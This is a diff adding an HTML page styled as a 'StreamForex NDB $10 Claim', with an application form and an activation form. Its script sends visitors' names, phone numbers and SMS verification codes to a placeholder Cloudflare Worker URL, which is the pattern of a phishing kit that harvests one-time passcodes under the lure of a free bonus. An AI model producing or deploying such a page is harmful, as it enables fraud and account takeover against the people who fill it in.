@@ -1,0 +1,91 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>StreamForex NDB $10 Claim</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to right, #eef2f3, #8e9eab);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px;
+    }
+    h2 {
+      color: #333;
+    }
+    form {
+      background: white;
+      padding: 20px;
+      margin: 15px 0;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      width: 300px;
+    }
+    input[type="text"], input[type="tel"] {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background: #28a745;
+      color: white;
+      padding: 10px;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #218838;
+    }
+  </style>
+</head>
+<body>
+  <h2>Application Form</h2>
+  <form id="application-form">
+    <input type="text" name="name" placeholder="Your Name" required />
+    <input type="tel" name="phone" placeholder="Your Phone Number" required />
+    <button type="submit">Submit Application</button>
+  </form>
+
+  <h2>Activation Form</h2>
+  <form id="activation-form">
+    <input type="text" name="name" placeholder="Your Name" required />
+    <input type="tel" name="phone" placeholder="Your Phone Number" required />
+    <input type="text" name="code" placeholder="SMS Code" required />
+    <button type="submit">Submit Activation</button>
+  </form>
+
+  <script>
+    const applicationForm = document.getElementById('application-form');
+    const activationForm = document.getElementById('activation-form');
+
+    applicationForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const formData = new FormData(applicationForm);
+      const data = Object.fromEntries(formData);
+      await fetch('https://YOUR-CLOUDFLARE-WORKER-URL', {
+        method: 'POST',
+        body: JSON.stringify({type: 'application', ...data}),
+      });
+      alert('Application submitted!');
+    });
+
+    activationForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const formData = new FormData(activationForm);
+      const data = Object.fromEntries(formData);
+      await fetch('https://YOUR-CLOUDFLARE-WORKER-URL', {
+        method: 'POST',
+        body: JSON.stringify({type: 'activation', ...data}),
+      });
+      alert('Activation submitted!');
+    });
+  </script>
+</body>
+</html>
